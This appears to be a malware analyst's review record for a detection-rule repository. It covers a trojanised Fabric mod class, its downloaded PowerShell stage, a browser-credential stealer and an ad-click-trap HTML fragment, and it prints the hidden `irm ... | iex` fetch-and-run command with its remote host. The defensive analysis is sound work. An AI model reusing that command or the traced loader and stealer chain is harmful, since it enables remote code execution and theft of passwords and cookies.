# Public-registry second review, 2026-10-23

Read RULES.md and TAXONOMY.md before analysis. All three originals are judged
MALICIOUS after static reverse engineering. No sample or acquired stage was run.
Scans are leads; these judgments follow the execution paths described below.

## Original artifacts and execution paths

* `d977c457df427d2022a284b4969fc8f5f9aa60ba4a81844c2ef0ca68269ccc51`:
  `tundra-client.jar`, a 1,118-byte ZIP with only
  `paneldrop/PanelDrop.class` (member SHA-256
  `52bf9bd6c3fc6a41b48c7e912b73581d3996308200693180cb7aaf848704bf00`).
  There is no manifest, Fabric registration, gameplay implementation or bundled
  runtime. Its class implements Fabric's ClientModInitializer. `javap -c -p`
  traces onInitializeClient: read os.name, normalize case, return on non-Windows;
  construct ProcessBuilder with powershell.exe, -NoLogo, -NoProfile,
  -NonInteractive, -WindowStyle Hidden, -Command and
  `irm 'https://tools.lumma.cy/21r5p?4m=n' | iex`; set stdout and stderr to
  Redirect.DISCARD; start the child; close its stdin; swallow IOException.
  The callback must be registered by an external host to run; that deployment
  context is absent. The hidden remote evaluator is unrelated to game behavior
  and supports a malicious-loader judgment despite incomplete packaging.
* `17d8efb5062398b69f46f8d4e8d8900f93c8bf9f4339033f296de592e1c8ae2c`:
  standalone Java 17 `paneldrop.PanelDrop`. The same traced code, with query
  `?-i=m` instead of `?4m=n`. It is a malicious Fabric loader component, with no
  supplied registration/host. Raw constant-pool inspection confirms ordinary
  quotes, not literal backslashes: javap escaped the quotes for presentation.
  Neither class has a custom decoder or embedded final payload. Their Windows
  condition is platform compatibility, not an established anti-analysis gate.
* `74e464f8ec19fd778896d27d17d10b95369f0330f97f60c9538ea7679bc1b4b7`:
  738-byte ad-click-trap HTML fragment, byte-identical to the existing repository
  positive fixture. A 27x20 absolute, transparent, high-stacking-order container
  holds an external ad-script source. A parent mousemove handler positions the
  container at pageY-10/pageX+30. Input/link mouseover and mouseout callbacks call
  trapHide/trapShow; a five-second string timeout rebinds these handlers.
  Concealed ad placement and inverse hover helpers support attempted ad-click
  deception. This is an incomplete/demonstration-sized fragment: jQuery is not
  supplied, trapHide/trapShow are undefined locally, ads.example.com is a
  placeholder, and +30 positions the box beside the pointer, not over it.
  Successful interception is not established. No page provenance or authorized
  testing context accompanies the artifact; the malicious judgment concerns the
  attempted concealed-ad mechanism, not observed successful fraud.

## Recovered downstream evidence (separate from original bytes)

Atomscan followed the standalone class URL and returned a cached 4,161-byte
PowerShell response, SHA-256
`53992f5e3e6a9b76ca11a7b0885212b1f180f6c1bd3c0ad94aad3e8edc59b78b`.
Forager live retrieval returned 404; hash recovery through Hopper recovered the
exact response with .forage.json provenance. Its random identifiers disguise
names, not a separate encrypted script. Trace:

1. Choose a random temp ZIP and extraction directory; delete a preexisting
   extraction directory. Try BITS, WebClient.DownloadFile and Invoke-WebRequest
   against one PNG-named URL and the same ZIP output, recording success.
2. Read bytes; optionally strip UTF-8 BOM; reject unless the first two bytes
   are PK. Try ZipFile.ExtractToDirectory, Expand-Archive, then Shell.Application
   NameSpace/CopyHere. The last route polls for the expected executable.
3. Join extraction directory and rename.exe; require that path to exist, change
   working directory there, launch it hidden, then restore the working directory.
   There is no script self-delete or post-launch payload cleanup in this source.

Forager retrieved the PNG URL as an actual ZIP, holding rename.exe and
.spread_meta. This is extension disguise, not image steganography. Static rizin
analysis of the PE corroborates browser-secret acquisition: rolling XOR
(key = (key + index) & 127) decodes the login query at file offset 0x270610,
seed 158, and cookie query at 0x2705b0, seed 152. Function 0x1401ef620 references
both. At 0x1401f0906 it seeds the login decoder; 0x1401f0928 XORs bytes and
0x1401f092e updates the key. The decoded query goes to the SQL prepare-shaped
call at 0x1401f095d, followed by step/row (100) checking and encrypted-blob column
access. Cookie reconstruction is referenced at 0x1401f0454. The queries select
password_value from logins and encrypted_value from cookies; they are not dead
strings. This PE also carries unsigned Microsoft update version claims.
No successful theft, transmission, family attribution or identity based merely
on the hostname is asserted. This recovered response is not proven to be what
the JAR's different query would have returned at its original deployment time.

## Trait corrections and preserved coverage

* Move the generic invisible-pointer composite from hostile social manipulation
  to notable ui/window/style, preserving all matcher legs and proximity. Its
  existing positive fixture is an empty div; it proves neither a clickable
  payload nor intercepted clicks. No exact or ancestor-directory YAML consumers
  of the old composite were found. The existing case map records the move.
* Require advertising-labelled script-source evidence in both ad-specific
  hostiles. Previously arbitrary analytics scripts plus an invisible pointer
  effect could satisfy an ad claim; one rule did not require any remote payload.
  The new source-label observation is notable and does not itself assert fraud.
* Hover atoms now require hide/show-named calls and say exactly that. Bare
  variables containing hide/show no longer prove a callback operation, and an
  undefined helper is not described as successfully changing visibility.
  Both objective consumers use the renamed callback composite.
* Add notable class-constant observations for -NoProfile and -NonInteractive.
  They assert option references, not invocation or evasive intent. Existing
  hidden-launch, HTTP/evaluation, process, stream and OS-property traits remain.

`check.py <scratch-output-directory>` passed 14 controls, including existing
outside-batch off-brand Like, self-removing Like, mousemove Like, invisible
iframe, visible iframe, dropdown and empty-follower fixtures. Four additional
controls exercise analytics, commented ads, static ads and vocabulary without
calls. Before/after comparison preserves every supported finding after ID
mapping. Lost matches are the demonstrated analytics/comment false positives
and bare helper-name vocabulary. The two retained ad hostiles have measured
precision 6.3 and 4.1. JVM option-removal controls check the two new exact
constants independently, while retaining the existing hostile loader findings.

## Before/after scans and limitations

Counts are hostile / suspicious / notable, for each original's local unit:

| Unit | Before | After | Raw model probability before → after | Model level |
| --- | --- | --- | --- | --- |
| JAR | 2 / 1 / 18 | 2 / 1 / 20 | .9921796 → .9922391 | 3000 → 3000 |
| JAR PanelDrop.class member | 2 / 1 / 18 | 2 / 1 / 20 | inherited parent | unchanged |
| Standalone PanelDrop.class | 2 / 1 / 20 | 2 / 1 / 22 | .99280053 → .99284583 | 2500 → 2500 |
| HTML | 3 / 0 / 11 | 2 / 0 / 13 | .9913286 → .9904584 | -1 → -1 |

The HTML model remains off its calibrated alert grid despite two hostile
rules: a classifier disagreement, not a reason to restore the overclaim.
Atomscan warns its v18 model omits newer v21 feature inputs. The class's fetched
PowerShell response stays at 0 / 0 / 42; it is not an archive member and its
behaviors are not statically attributed to the parent. No supported local
observation is lost in any original after mapping the corrected IDs.

The three-to-five hostile goal is unmet. The classes support hidden web
execution and discarded-output concealment; a third independent objective is
not present in their bytes. Fabric's interface is not persistence. HTML shows
one attempted ad-fraud scheme with two retained findings; it has no click-success
poll, teardown, credentials or additional payload execution. Its timeout is
handler rebinding, not cleanup. No quota-only hostile was added.

A remaining detector gap is the fetched PowerShell's complete disguised-archive
launch chain. Existing notable primitives cover download, extraction and hidden
launch, but its long fallback structure defeats the existing 40-line
co-occurrence composite. Inspected PowerShell facts leave the relevant variables
unknown; they do not bind URL → ZIP → extraction path → launched executable.
An image URL plus unrelated extraction/launch would convict ordinary installers,
so no hostile co-occurrence shortcut was added. That gap and the HTML model miss
remain explicit. Delivery, authorization and runtime success are unknown.

Detailed raw facts, javap/rizin traces, Forager artifacts/provenance, scans,
control results and full ID comparisons are under the session scratch directory
`/usr/local/var/cyclotron/tmp.noindex/cyclotron-d75a9cc3/scratch/acquit-review`.
Final required action after these records and judgment markers: `make validate`.

The first validation found a preexisting stale expectation in
`go-gzip-stage-exec.go`: `metadata/file/encoding::base64-decoded-gz` is not an
emitted engine ID. The source-matched engine uses a legacy binary embedded ID
for non-ZIP compression and suppresses that generic container observation in
testdata paths. Direct inspection confirms a real Base64/GZIP blob and a Go
decode → gzip reader → temporary file write → exec.Command path. Both HEAD
and the revised traits miss the obsolete ID. Its expectation now requires the
four actual decode/decompress/write/launch observations, retaining the same
score, suspicious-count floor and stdout-only exclusion. No rule or attack
detection was weakened for this validation repair.
